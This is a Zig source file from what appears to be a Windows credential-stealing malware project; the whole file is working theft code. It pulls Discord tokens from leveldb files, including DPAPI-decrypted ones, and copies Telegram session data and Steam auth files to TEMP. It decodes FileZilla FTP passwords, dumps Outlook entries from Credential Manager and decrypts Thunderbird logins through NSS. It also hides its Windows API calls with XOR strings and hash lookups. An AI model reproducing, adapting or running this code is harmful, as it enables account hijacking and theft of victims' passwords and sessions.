const std = @import("std");
const obf = @import("obf.zig");
const dpapi = @import("dpapi.zig");
const coleta = @import("coleta.zig");
const winfs = @import("winfs.zig");

fn isTokenChar(c: u8) bool {
    return (c >= 'A' and c <= 'Z') or (c >= 'a' and c <= 'z') or (c >= '0' and c <= '9') or c == '_' or c == '-';
}

fn isBase64Char(c: u8) bool {
    return (c >= 'A' and c <= 'Z') or (c >= 'a' and c <= 'z') or (c >= '0' and c <= '9') or c == '+' or c == '/' or c == '=';
}

fn scanPlaintextTokens(allocator: std.mem.Allocator, content: []const u8, col: *coleta.Coleta) void {
    var i: usize = 0;
    while (i < content.len) : (i += 1) {
        // MFA token: mfa.[84+ base64 chars]
        if (i + 4 < content.len and content[i] == 'm' and content[i + 1] == 'f' and content[i + 2] == 'a' and content[i + 3] == '.') {
            const start = i;
            var end = i + 4;
            while (end < content.len and isTokenChar(content[end])) : (end += 1) {}
            if (end - start >= 88) {
                const token = allocator.dupe(u8, content[start..end]) catch continue;
                var is_dup = false;
                for (col.discord_tokens.items) |existing| {
                    if (std.mem.eql(u8, existing, token)) {
                        is_dup = true;
                        break;
                    }
                }
                if (is_dup) {
                    allocator.free(token);
                    i = end;
                    continue;
                }
                col.discord_tokens.append(allocator, token) catch {
                    allocator.free(token);
                    continue;
                };
                i = end;
                continue;
            }
        }

        // Regular token: 20+ chars . 4+ chars . 20+ chars
        if (i + 59 <= content.len) {
            var part1_end: usize = i;
            while (part1_end < content.len and isTokenChar(content[part1_end])) : (part1_end += 1) {}
            if (part1_end - i >= 20 and part1_end < content.len and content[part1_end] == '.') {
                const dot1 = part1_end;
                var part2_end = dot1 + 1;
                while (part2_end < content.len and isTokenChar(content[part2_end])) : (part2_end += 1) {}
                if (part2_end - dot1 - 1 >= 4 and part2_end < content.len and content[part2_end] == '.') {
                    const dot2 = part2_end;
                    var part3_end = dot2 + 1;
                    while (part3_end < content.len and isTokenChar(content[part3_end])) : (part3_end += 1) {}
                    if (part3_end - dot2 - 1 >= 20) {
                        const token = allocator.dupe(u8, content[i..part3_end]) catch continue;
                        var is_dup = false;
                        for (col.discord_tokens.items) |existing| {
                            if (std.mem.eql(u8, existing, token)) {
                                is_dup = true;
                                break;
                            }
                        }
                        if (is_dup) {
                            allocator.free(token);
                            i = part3_end;
                            continue;
                        }
                        col.discord_tokens.append(allocator, token) catch {
                            allocator.free(token);
                            continue;
                        };
                        i = part3_end;
                        continue;
                    }
                }
            }
        }
    }
}

fn tryDecryptDPAPITokens(allocator: std.mem.Allocator, content: []const u8, col: *coleta.Coleta) void {
    // Method 1: Base64-encoded DPAPI blobs
    // "RFBBUEk" = base64 encoding of "DPAPI" prefix
    const b64_marker = "RFBBUEk";
    var search_pos: usize = 0;
    while (search_pos < content.len) {
        const found_idx = std.mem.indexOfPos(u8, content, search_pos, b64_marker) orelse break;

        // Find start of base64 string (scan backwards)
        var b64_start = found_idx;
        while (b64_start > 0 and isBase64Char(content[b64_start - 1])) {
            b64_start -= 1;
        }

        // Find end of base64 string (scan forwards)
        var b64_end = found_idx;
        while (b64_end < content.len and isBase64Char(content[b64_end])) {
            b64_end += 1;
        }

        if (b64_end > b64_start + 7) {
            const b64_str = content[b64_start..b64_end];
            const decoder = std.base64.standard.Decoder;
            const decoded_len = decoder.calcSizeForSlice(b64_str) catch {
                search_pos = b64_end;
                continue;
            };
            const decoded = allocator.alloc(u8, decoded_len) catch {
                search_pos = b64_end;
                continue;
            };
            defer allocator.free(decoded);

            decoder.decode(decoded, b64_str) catch {
                search_pos = b64_end;
                continue;
            };

            // Check for "DPAPI" prefix
            if (decoded.len > 5 and std.mem.eql(u8, decoded[0..5], "DPAPI")) {
                const encrypted_data = decoded[5..];
                if (encrypted_data.len > 0) {
                    if (dpapi.unprotectData(allocator, encrypted_data)) |decrypted| {
                        defer allocator.free(decrypted);
                        scanPlaintextTokens(allocator, decrypted, col);
                    } else |_| {}
                }
            }
        }
        search_pos = b64_end;
    }

    // Method 2: Raw DPAPI blob detection
    // DPAPI blob signature: version 0x01000000 + provider GUID
    const dpapi_sig = [_]u8{
        0x01, 0x00, 0x00, 0x00,
        0xD0, 0x8C, 0x9D, 0xDF, 0x0E, 0x15, 0xD1, 0x11,
        0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97, 0xEB,
    };
    var raw_pos: usize = 0;
    while (raw_pos < content.len) {
        const found = std.mem.indexOfPos(u8, content, raw_pos, &dpapi_sig) orelse break;

        // Try to decrypt with a generous chunk (CryptUnprotectData reads the blob structure)
        const max_size: usize = if (content.len - found > 4096) 4096 else content.len - found;
        const blob_data = content[found..found + max_size];

        if (dpapi.unprotectData(allocator, blob_data)) |decrypted| {
            defer allocator.free(decrypted);
            scanPlaintextTokens(allocator, decrypted, col);
        } else |_| {
            // Try smaller chunks
            var try_size: usize = 300;
            while (try_size >= 50) : (try_size -= 50) {
                if (try_size > blob_data.len) continue;
                if (dpapi.unprotectData(allocator, blob_data[0..try_size])) |decrypted| {
                    defer allocator.free(decrypted);
                    scanPlaintextTokens(allocator, decrypted, col);
                    break;
                } else |_| {}
            }
        }
        raw_pos = found + 4;
    }
}

fn extractTokensFromContent(allocator: std.mem.Allocator, content: []const u8, col: *coleta.Coleta) void {
    // First: try DPAPI-encrypted token decryption (Discord ~2023+)
    tryDecryptDPAPITokens(allocator, content, col);

    // Then: plaintext token scan (fallback for older versions)
    scanPlaintextTokens(allocator, content, col);
}

pub fn discord(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const furtivo = @import("furtivo.zig");
    const app_data = furtivo.getEnvVar(allocator, "APPDATA") catch return;
    defer allocator.free(app_data);

    const paths = [_][]const u8{
        "discord",
        "discordcanary",
        "discordptb",
    };

    for (paths) |p| {
        const base_path = std.fs.path.join(allocator, &[_][]const u8{ app_data, p, "Local Storage", "leveldb" }) catch continue;
        defer allocator.free(base_path);

        if (!winfs.pathExists(base_path)) continue;

        var dir_iter = winfs.DirIter.open(base_path) orelse continue;
        defer dir_iter.deinit();

        while (dir_iter.next(allocator)) |entry| {
            defer allocator.free(entry.name);
            if (entry.is_dir) continue;
            if (!std.mem.endsWith(u8, entry.name, ".ldb") and !std.mem.endsWith(u8, entry.name, ".log")) continue;

            const file_path = std.fs.path.join(allocator, &[_][]const u8{ base_path, entry.name }) catch continue;
            defer allocator.free(file_path);

            const content = winfs.readFileAlloc(allocator, file_path, 10 * 1024 * 1024) catch continue;
            defer allocator.free(content);

            extractTokensFromContent(allocator, content, col);
        }
    }
}

fn copyDirRecursive(allocator: std.mem.Allocator, src: []const u8, dst: []const u8) !void {
    winfs.makeDir(dst) catch {};

    var dir_iter = winfs.DirIter.open(src) orelse return;
    defer dir_iter.deinit();

    while (dir_iter.next(allocator)) |entry| {
        defer allocator.free(entry.name);
        const src_path = std.fs.path.join(allocator, &[_][]const u8{ src, entry.name }) catch continue;
        defer allocator.free(src_path);
        const dst_path = std.fs.path.join(allocator, &[_][]const u8{ dst, entry.name }) catch continue;
        defer allocator.free(dst_path);

        if (entry.is_dir) {
            try copyDirRecursive(allocator, src_path, dst_path);
        } else {
            winfs.copyFileShared(allocator, src_path, dst_path) catch {};
        }
    }
}

fn listFilesRecursive(allocator: std.mem.Allocator, base: []const u8, col: *coleta.Coleta, comptime target: enum { telegram, steam }) void {
    var dir_iter = winfs.DirIter.open(base) orelse return;
    defer dir_iter.deinit();

    while (dir_iter.next(allocator)) |entry| {
        const fpath = std.fs.path.join(allocator, &[_][]const u8{ base, entry.name }) catch continue;
        if (entry.is_dir) {
            listFilesRecursive(allocator, fpath, col, target);
            allocator.free(fpath);
        } else {
            switch (target) {
                .telegram => {
                    col.telegram_arquivos.append(allocator, fpath) catch {
                        allocator.free(fpath);
                    };
                },
                .steam => {
                    col.steam_arquivos.append(allocator, fpath) catch {
                        allocator.free(fpath);
                    };
                },
            }
        }
    }
}

pub fn telegram(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const furtivo = @import("furtivo.zig");
    const app_data = furtivo.getEnvVar(allocator, "APPDATA") catch return;
    defer allocator.free(app_data);

    const tdata_src = std.fs.path.join(allocator, &[_][]const u8{ app_data, "Telegram Desktop", "tdata" }) catch return;
    defer allocator.free(tdata_src);

    if (!winfs.pathExists(tdata_src)) return;

    const temp = furtivo.getEnvVar(allocator, "TEMP") catch return;
    defer allocator.free(temp);

    const tdata_dst = std.fs.path.join(allocator, &[_][]const u8{ temp, "pipeta_tdata" }) catch return;
    defer allocator.free(tdata_dst);

    copyDirRecursive(allocator, tdata_src, tdata_dst) catch return;

    listFilesRecursive(allocator, tdata_dst, col, .telegram);
}

pub fn steam(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const furtivo = @import("furtivo.zig");
    const temp = furtivo.getEnvVar(allocator, "TEMP") catch return;
    defer allocator.free(temp);

    const steam_dst = std.fs.path.join(allocator, &[_][]const u8{ temp, "pipeta_steam" }) catch return;
    defer allocator.free(steam_dst);
    winfs.makeDir(steam_dst) catch {};

    // Build dynamic path list: registry paths first, then hardcoded fallbacks
    var steam_paths_list = std.ArrayList([]const u8).empty;

    // Registry-based Steam path detection
    const advapi32 = furtivo.getModuleHandle(&comptime obf.xorStr("advapi32.dll"));
    if (advapi32 != 0) {
        const regopen_addr = obf.getProcAddressByHash(advapi32, comptime obf.apiHash("RegOpenKeyExA")) catch 0;
        const regquery_addr = obf.getProcAddressByHash(advapi32, comptime obf.apiHash("RegQueryValueExA")) catch 0;
        const regclose_addr = obf.getProcAddressByHash(advapi32, comptime obf.apiHash("RegCloseKey")) catch 0;

        if (regopen_addr != 0 and regquery_addr != 0 and regclose_addr != 0) {
            const RegOpenKeyExA = @as(*const fn (usize, [*:0]const u8, u32, u32, *usize) callconv(.winapi) c_int, @ptrFromInt(regopen_addr));
            const RegQueryValueExA = @as(*const fn (usize, [*:0]const u8, ?*u32, ?*u32, ?[*]u8, ?*u32) callconv(.winapi) c_int, @ptrFromInt(regquery_addr));
            const RegCloseKey = @as(*const fn (usize) callconv(.winapi) c_int, @ptrFromInt(regclose_addr));

            const HKEY_LOCAL_MACHINE: usize = 0x80000002;
            const KEY_READ: u32 = 0x20019;
            const subkey_wow64: [:0]const u8 = "SOFTWARE\\WOW6432Node\\Valve\\Steam";
            const subkey_32bit: [:0]const u8 = "SOFTWARE\\Valve\\Steam";
            const value_name: [*:0]const u8 = "InstallPath";

            const subkeys = [_][:0]const u8{ subkey_wow64, subkey_32bit };
            for (subkeys) |subkey| {
                var hkey: usize = 0;
                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &hkey) == 0) {
                    defer _ = RegCloseKey(hkey);

                    var buf: [260]u8 = undefined;
                    var buf_len: u32 = 260;
                    if (RegQueryValueExA(hkey, value_name, null, null, &buf, &buf_len) == 0) {
                        // RegQueryValueExA reports the size including the trailing NUL
                        const reg_path = allocator.dupe(u8, std.mem.sliceTo(buf[0..buf_len], 0)) catch continue;
                        steam_paths_list.append(allocator, reg_path) catch {
                            allocator.free(reg_path);
                        };
                    }
                }
            }
        }
    }

    // Hardcoded fallback paths
    const hardcoded = [_][]const u8{
        "C:\\Program Files (x86)\\Steam",
        "C:\\Program Files\\Steam",
        "D:\\Steam",
    };
    for (hardcoded) |hp| {
        steam_paths_list.append(allocator, hp) catch continue;
    }

    const steam_paths = steam_paths_list.items;
    defer {
        // Free registry-allocated paths (hardcoded are static literals, don't free)
        for (steam_paths) |sp| {
            if (sp.ptr != hardcoded[0].ptr and
                sp.ptr != hardcoded[1].ptr and
                sp.ptr != hardcoded[2].ptr)
            {
                allocator.free(sp);
            }
        }
        steam_paths_list.deinit(allocator);
    }

    for (steam_paths) |sp| {
        if (!winfs.pathExists(sp)) continue;

        // ssfn files
        var dir_iter = winfs.DirIter.open(sp) orelse continue;
        defer dir_iter.deinit();

        while (dir_iter.next(allocator)) |entry| {
            defer allocator.free(entry.name);
            if (entry.is_dir) continue;
            if (!std.mem.startsWith(u8, entry.name, "ssfn")) continue;

            const src = std.fs.path.join(allocator, &[_][]const u8{ sp, entry.name }) catch continue;
            defer allocator.free(src);
            const dst = std.fs.path.join(allocator, &[_][]const u8{ steam_dst, entry.name }) catch continue;
            defer allocator.free(dst);
            winfs.copyFile(src, dst) catch {};
            const recorded = allocator.dupe(u8, src) catch continue;
            col.steam_arquivos.append(allocator, recorded) catch {
                allocator.free(recorded);
            };
        }

        // loginusers.vdf
        const vdf_src = std.fs.path.join(allocator, &[_][]const u8{ sp, "config", "loginusers.vdf" }) catch continue;
        defer allocator.free(vdf_src);
        if (winfs.pathExists(vdf_src)) {
            const vdf_dst = std.fs.path.join(allocator, &[_][]const u8{ steam_dst, "loginusers.vdf" }) catch continue;
            defer allocator.free(vdf_dst);
            winfs.copyFile(vdf_src, vdf_dst) catch {};
            const recorded = allocator.dupe(u8, vdf_src) catch continue;
            col.steam_arquivos.append(allocator, recorded) catch {
                allocator.free(recorded);
            };
        }

        // config.vdf
        const cfg_src = std.fs.path.join(allocator, &[_][]const u8{ sp, "config", "config.vdf" }) catch continue;
        defer allocator.free(cfg_src);
        if (winfs.pathExists(cfg_src)) {
            const cfg_dst = std.fs.path.join(allocator, &[_][]const u8{ steam_dst, "config.vdf" }) catch continue;
            defer allocator.free(cfg_dst);
            winfs.copyFile(cfg_src, cfg_dst) catch {};
            const recorded = allocator.dupe(u8, cfg_src) catch continue;
            col.steam_arquivos.append(allocator, recorded) catch {
                allocator.free(recorded);
            };
        }
    }
}

// ========================================================
// FileZilla FTP credentials
// ========================================================

fn parseFilezillaXml(allocator: std.mem.Allocator, content: []const u8, col: *coleta.Coleta) void {
    // Simple XML parser for FileZilla's recentservers.xml / sitemanager.xml
    // Format: <Server><Host>...</Host><Port>...</Port><User>...</User><Pass encoding="base64">...</Pass></Server>
    var pos: usize = 0;
    while (pos < content.len) {
        const server_start = std.mem.indexOfPos(u8, content, pos, "<Server>") orelse break;
        const server_end = std.mem.indexOfPos(u8, content, server_start, "</Server>") orelse break;
        const server_block = content[server_start..server_end];

        var host: []const u8 = "";
        var port: u16 = 21;
        var user: []const u8 = "";
        var pass_b64: []const u8 = "";

        // Extract Host
        if (std.mem.indexOf(u8, server_block, "<Host>")) |hs| {
            if (std.mem.indexOfPos(u8, server_block, hs, "</Host>")) |he| {
                host = std.mem.trim(u8, server_block[hs + 6 .. he], " \r\n\t");
            }
        }

        // Extract Port
        if (std.mem.indexOf(u8, server_block, "<Port>")) |ps| {
            if (std.mem.indexOfPos(u8, server_block, ps, "</Port>")) |pe| {
                const port_str = std.mem.trim(u8, server_block[ps + 6 .. pe], " \r\n\t");
                port = std.fmt.parseInt(u16, port_str, 10) catch 21;
            }
        }

        // Extract User
        if (std.mem.indexOf(u8, server_block, "<User>")) |us| {
            if (std.mem.indexOfPos(u8, server_block, us, "</User>")) |ue| {
                user = std.mem.trim(u8, server_block[us + 6 .. ue], " \r\n\t");
            }
        }

        // Extract Pass (base64 encoded)
        if (std.mem.indexOf(u8, server_block, "<Pass")) |pas| {
            // Find the closing > of the Pass tag (could have attributes like encoding="base64")
            if (std.mem.indexOfPos(u8, server_block, pas, ">")) |tag_end| {
                if (std.mem.indexOfPos(u8, server_block, tag_end, "</Pass>")) |pass_end| {
                    pass_b64 = std.mem.trim(u8, server_block[tag_end + 1 .. pass_end], " \r\n\t");
                }
            }
        }

        if (host.len == 0 and user.len == 0) {
            pos = server_end + 9;
            continue;
        }

        // Decode base64 password
        var senha_decoded: []u8 = "";
        if (pass_b64.len > 0) {
            const decoder = std.base64.standard.Decoder;
            const dec_len = decoder.calcSizeForSlice(pass_b64) catch 0;
            if (dec_len > 0) {
                const decoded = allocator.alloc(u8, dec_len) catch null;
                if (decoded) |dec| {
                    if (decoder.decode(dec, pass_b64)) |_| {
                        senha_decoded = dec;
                    } else |_| {
                        allocator.free(dec);
                    }
                }
            }
        }

        col.filezilla.append(allocator, .{
            .host = allocator.dupe(u8, host) catch "",
            .port = port,
            .user = allocator.dupe(u8, user) catch "",
            .senha = allocator.dupe(u8, senha_decoded) catch "",
        }) catch {};

        if (senha_decoded.len > 0) allocator.free(senha_decoded);

        pos = server_end + 9;
    }
}

pub fn filezilla(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const furtivo = @import("furtivo.zig");
    const app_data = furtivo.getEnvVar(allocator, "APPDATA") catch return;
    defer allocator.free(app_data);

    const fz_dir = std.fs.path.join(allocator, &[_][]const u8{ app_data, "FileZilla" }) catch return;
    defer allocator.free(fz_dir);

    if (!winfs.pathExists(fz_dir)) return;

    // Read recentservers.xml
    const recent_path = std.fs.path.join(allocator, &[_][]const u8{ fz_dir, "recentservers.xml" }) catch return;
    defer allocator.free(recent_path);
    if (winfs.pathExists(recent_path)) {
        const content = winfs.readFileAlloc(allocator, recent_path, 1024 * 1024) catch return;
        defer allocator.free(content);
        parseFilezillaXml(allocator, content, col);
    }

    // Read sitemanager.xml
    const sm_path = std.fs.path.join(allocator, &[_][]const u8{ fz_dir, "sitemanager.xml" }) catch return;
    defer allocator.free(sm_path);
    if (winfs.pathExists(sm_path)) {
        const content = winfs.readFileAlloc(allocator, sm_path, 1024 * 1024) catch return;
        defer allocator.free(content);
        parseFilezillaXml(allocator, content, col);
    }
}

// ========================================================
// Outlook stored credentials (Windows Credential Manager)
// ========================================================

const CREDENTIAL_ATTRIBUTEW = extern struct {
    Keyword: [260]u16,
    Flags: u32,
    ValueSize: u32,
    Value: ?*anyopaque,
};

const CREDENTIALW = extern struct {
    Flags: u32,
    Type: u32,
    TargetName: ?[*:0]const u16,
    Comment: ?[*:0]const u16,
    LastWritten: [2]u32, // FILETIME
    CredentialBlobSize: u32,
    CredentialBlob: ?*anyopaque,
    Persist: u32,
    AttributeCount: u32,
    Attributes: ?*CREDENTIAL_ATTRIBUTEW,
    TargetAlias: ?[*:0]const u16,
    UserName: ?[*:0]const u16,
};

pub fn outlook(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const furtivo = @import("furtivo.zig");
    const obf_mod = @import("obf.zig");

    const advapi32 = furtivo.getModuleHandle(&comptime obf_mod.xorStr("advapi32.dll"));
    if (advapi32 == 0) return;

    const cred_enum_addr = obf_mod.getProcAddressByHash(advapi32, comptime obf_mod.apiHash("CredEnumerateW")) catch 0;
    const cred_free_addr = obf_mod.getProcAddressByHash(advapi32, comptime obf_mod.apiHash("CredFree")) catch 0;
    if (cred_enum_addr == 0 or cred_free_addr == 0) return;

    const CredEnumerateW = @as(*const fn (?[*:0]const u16, u32, *u32, *[*]?*CREDENTIALW) callconv(.winapi) i32, @ptrFromInt(cred_enum_addr));
    const CredFree = @as(*const fn (?*anyopaque) callconv(.winapi) void, @ptrFromInt(cred_free_addr));

    var count: u32 = 0;
    var creds_ptr: [*]?*CREDENTIALW = undefined;

    // CRED_ENUMERATE_ALL_CREDENTIALS = 0x1
    if (CredEnumerateW(null, 0x1, &count, &creds_ptr) == 0) return;
    defer CredFree(@ptrCast(creds_ptr));

    var i: u32 = 0;
    while (i < count) : (i += 1) {
        const cred = creds_ptr[i] orelse continue;

        // Get target name as UTF-8
        const target_name_w = cred.TargetName orelse continue;
        var name_len: usize = 0;
        while (target_name_w[name_len] != 0) : (name_len += 1) {}
        if (name_len == 0) continue;

        const target_u8 = std.unicode.utf16LeToUtf8Alloc(allocator, target_name_w[0..name_len]) catch continue;
        defer allocator.free(target_u8);

        // Filter for Outlook / Microsoft Office entries
        const filter_terms = [_][]const u8{
            "Microsoft Office",
            "Outlook",
            "microsoftoffice",
            "outlook",
        };
        var is_match = false;
        for (filter_terms) |term| {
            if (std.mem.indexOf(u8, target_u8, term) != null) {
                is_match = true;
                break;
            }
        }
        if (!is_match) continue;

        // Extract username
        var username: []const u8 = "";
        if (cred.UserName) |un_w| {
            var un_len: usize = 0;
            while (un_w[un_len] != 0) : (un_len += 1) {}
            if (un_len > 0) {
                username = std.unicode.utf16LeToUtf8Alloc(allocator, un_w[0..un_len]) catch "";
            }
        }

        // Extract credential blob (password)
        var password: []const u8 = "";
        if (cred.CredentialBlobSize > 0 and cred.CredentialBlob != null) {
            const blob_ptr = @as([*]const u16, @ptrCast(@alignCast(cred.CredentialBlob.?)));
            const blob_len = cred.CredentialBlobSize / 2;
            if (blob_len > 0) {
                password = std.unicode.utf16LeToUtf8Alloc(allocator, blob_ptr[0..blob_len]) catch "";
            }
        }

        col.emails.append(allocator, .{
            .app = allocator.dupe(u8, "Outlook") catch "",
            .user = allocator.dupe(u8, username) catch "",
            .senha = allocator.dupe(u8, password) catch "",
        }) catch {};

        if (username.len > 0) allocator.free(username);
        if (password.len > 0) allocator.free(password);
    }
}

// ========================================================
// Thunderbird email credentials (reuses Firefox NSS)
// ========================================================

fn findThunderbirdProfiles(allocator: std.mem.Allocator, app_data: []const u8) ![][]u8 {
    const ini_path = std.fs.path.join(allocator, &[_][]const u8{ app_data, "Thunderbird", "profiles.ini" }) catch return error.PathError;
    defer allocator.free(ini_path);

    if (!winfs.pathExists(ini_path)) return error.FileNotFound;

    const content = winfs.readFileAlloc(allocator, ini_path, 1024 * 1024) catch return error.ReadError;
    defer allocator.free(content);

    var profiles = std.ArrayList([]u8).empty;

    var lines = std.mem.splitScalar(u8, content, '\n');
    var in_profile_section = false;
    var is_relative: bool = true;
    var profile_path: ?[]u8 = null;

    while (lines.next()) |line| {
        const trimmed = std.mem.trim(u8, line, " \r\t");

        if (trimmed.len > 0 and trimmed[0] == '[') {
            // Save previous profile if we have one
            if (profile_path) |pp| {
                const full_path = if (is_relative)
                    std.fs.path.join(allocator, &[_][]const u8{ app_data, "Thunderbird", pp }) catch null
                else
                    allocator.dupe(u8, pp) catch null;
                if (full_path) |fp| {
                    profiles.append(allocator, fp) catch {};
                }
                allocator.free(pp);
                profile_path = null;
            }

            in_profile_section = std.mem.startsWith(u8, trimmed, "[Profile");
            is_relative = true;
        } else if (in_profile_section) {
            if (std.mem.startsWith(u8, trimmed, "IsRelative=")) {
                is_relative = trimmed[11] == '1';
            } else if (std.mem.startsWith(u8, trimmed, "Path=")) {
                if (profile_path) |pp| allocator.free(pp);
                profile_path = allocator.dupe(u8, trimmed[5..]) catch null;
            }
        }
    }

    // Don't forget the last profile
    if (profile_path) |pp| {
        const full_path = if (is_relative)
            std.fs.path.join(allocator, &[_][]const u8{ app_data, "Thunderbird", pp }) catch null
        else
            allocator.dupe(u8, pp) catch null;
        if (full_path) |fp| {
            profiles.append(allocator, fp) catch {};
        }
        allocator.free(pp);
    }

    return profiles.toOwnedSlice(allocator);
}

pub fn thunderbird(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const furtivo = @import("furtivo.zig");
    const obf_mod = @import("obf.zig");
    const app_data = furtivo.getEnvVar(allocator, "APPDATA") catch return;
    defer allocator.free(app_data);

    // Find Thunderbird profiles
    const profiles = findThunderbirdProfiles(allocator, app_data) catch return;
    defer {
        for (profiles) |p| allocator.free(p);
        allocator.free(profiles);
    }

    if (profiles.len == 0) return;

    // Get kernel32 for LoadLibraryA
    const k32 = furtivo.getModuleHandle(&comptime obf_mod.xorStr("kernel32.dll"));
    if (k32 == 0) return;

    // Try to find nss3.dll already loaded, otherwise load it
    var nss3 = furtivo.getModuleHandle(&comptime obf_mod.xorStr("nss3.dll"));

    if (nss3 == 0) {
        const loadlib_addr = obf_mod.getProcAddressByHash(k32, comptime obf_mod.apiHash("LoadLibraryA")) catch return;
        if (loadlib_addr == 0) return;
        const LoadLibraryA = @as(*const fn ([*:0]const u8) callconv(.winapi) usize, @ptrFromInt(loadlib_addr));

        const nss3_name = obf_mod.dexor(allocator, &comptime obf_mod.xorStr("nss3.dll")) catch return;
        defer allocator.free(nss3_name);
        const nss3_name_z = allocator.dupeZ(u8, nss3_name) catch return;
        defer allocator.free(nss3_name_z);

        nss3 = LoadLibraryA(nss3_name_z.ptr);
        if (nss3 == 0) return;
    }

    // Resolve NSS function pointers
    const nss_init_addr = obf_mod.getProcAddressByHash(nss3, comptime obf_mod.apiHash("NSS_Init")) catch return;
    if (nss_init_addr == 0) return;
    const NSS_Init = @as(*const fn ([*:0]const u8) callconv(.c) c_int, @ptrFromInt(nss_init_addr));

    const get_slot_addr = obf_mod.getProcAddressByHash(nss3, comptime obf_mod.apiHash("PK11_GetInternalKeySlot")) catch return;
    if (get_slot_addr == 0) return;
    const PK11_GetInternalKeySlot = @as(*const fn () callconv(.c) ?*anyopaque, @ptrFromInt(get_slot_addr));

    const auth_addr = obf_mod.getProcAddressByHash(nss3, comptime obf_mod.apiHash("PK11_Authenticate")) catch return;
    if (auth_addr == 0) return;
    const PK11_Authenticate = @as(*const fn (?*anyopaque, c_int, ?*anyopaque) callconv(.c) c_int, @ptrFromInt(auth_addr));

    // Reuse the same SECItem struct and decrypt pattern as Firefox
    const SECItem = extern struct {
        type: u32 = 0,
        data: [*]u8 = undefined,
        len: u32 = 0,
    };
    const PK11SDR_DecryptFn = *const fn (*SECItem, *SECItem, ?*anyopaque) callconv(.c) c_int;

    const sdr_decrypt_addr = obf_mod.getProcAddressByHash(nss3, comptime obf_mod.apiHash("PK11SDR_Decrypt")) catch return;
    if (sdr_decrypt_addr == 0) return;
    const PK11SDR_Decrypt = @as(PK11SDR_DecryptFn, @ptrFromInt(sdr_decrypt_addr));

    const SECItemFreeFn = *const fn (*SECItem, c_int) callconv(.c) void;
    const free_item_addr = obf_mod.getProcAddressByHash(nss3, comptime obf_mod.apiHash("SECITEM_FreeItem")) catch 0;
    const SECITEM_FreeItem: ?SECItemFreeFn = if (free_item_addr != 0) @ptrFromInt(free_item_addr) else null;

    const shutdown_addr = obf_mod.getProcAddressByHash(nss3, comptime obf_mod.apiHash("NSS_Shutdown")) catch 0;
    const NSS_Shutdown: ?*const fn () callconv(.c) void = if (shutdown_addr != 0)
        @ptrFromInt(shutdown_addr)
    else
        null;

    for (profiles) |profile_path| {
        if (!winfs.pathExists(profile_path)) continue;

        // Read logins.json (same format as Firefox)
        const logins_path = std.fs.path.join(allocator, &[_][]const u8{ profile_path, "logins.json" }) catch continue;
        defer allocator.free(logins_path);

        if (!winfs.pathExists(logins_path)) continue;

        const content = winfs.readFileAlloc(allocator, logins_path, 10 * 1024 * 1024) catch continue;
        defer allocator.free(content);

        // Parse JSON
        const parsed = std.json.parseFromSlice(std.json.Value, allocator, content, .{}) catch continue;
        defer parsed.deinit();

        const root = parsed.value.object;
        const logins_val = root.get("logins") orelse continue;
        const logins_arr = logins_val.array;

        // Initialize NSS with this profile
        const profile_path_z = allocator.dupeZ(u8, profile_path) catch continue;
        defer allocator.free(profile_path_z);

        if (NSS_Init(profile_path_z.ptr) != 0) continue;

        const slot = PK11_GetInternalKeySlot();
        if (slot == null) {
            if (NSS_Shutdown) |shutdown| shutdown();
            continue;
        }

        if (PK11_Authenticate(slot, 0, null) != 0) {
            if (NSS_Shutdown) |shutdown| shutdown();
            continue;
        }

        for (logins_arr.items) |login_val| {
            const login = login_val.object;

            const hostname_val = login.get("hostname") orelse continue;
            _ = hostname_val.string;

            const enc_user_val = login.get("encryptedUsername") orelse continue;
            const enc_user_b64 = enc_user_val.string;

            const enc_pass_val = login.get("encryptedPassword") orelse continue;
            const enc_pass_b64 = enc_pass_val.string;

            // Decrypt username via NSS
            const user_dec = nssDecrypt(allocator, enc_user_b64, PK11SDR_Decrypt, SECITEM_FreeItem, SECItem) orelse continue;
            defer allocator.free(user_dec);

            // Decrypt password via NSS
            const pass_dec = nssDecrypt(allocator, enc_pass_b64, PK11SDR_Decrypt, SECITEM_FreeItem, SECItem) orelse continue;
            defer allocator.free(pass_dec);

            col.emails.append(allocator, .{
                .app = allocator.dupe(u8, "Thunderbird") catch continue,
                .user = allocator.dupe(u8, user_dec) catch continue,
                .senha = allocator.dupe(u8, pass_dec) catch continue,
            }) catch continue;
        }

        if (NSS_Shutdown) |shutdown| shutdown();
    }
}

fn nssDecrypt(allocator: std.mem.Allocator, b64_data: []const u8, decrypt_fn: anytype, free_fn: anytype, comptime SECItem: type) ?[]u8 {
    const decoder = std.base64.standard.Decoder;
    const decoded_len = decoder.calcSizeForSlice(b64_data) catch return null;
    const decoded = allocator.alloc(u8, decoded_len) catch return null;
    defer allocator.free(decoded);
    decoder.decode(decoded, b64_data) catch return null;

    var input_item = SECItem{
        .type = 0,
        .data = decoded.ptr,
        .len = @intCast(decoded.len),
    };

    var output_item = SECItem{
        .type = 0,
        .data = undefined,
        .len = 0,
    };

    if (decrypt_fn(&input_item, &output_item, null) != 0) return null;
    defer if (free_fn) |f| f(&output_item, 0);
    if (output_item.len == 0) return null;

    return allocator.dupe(u8, output_item.data[0..output_item.len]) catch null;
}
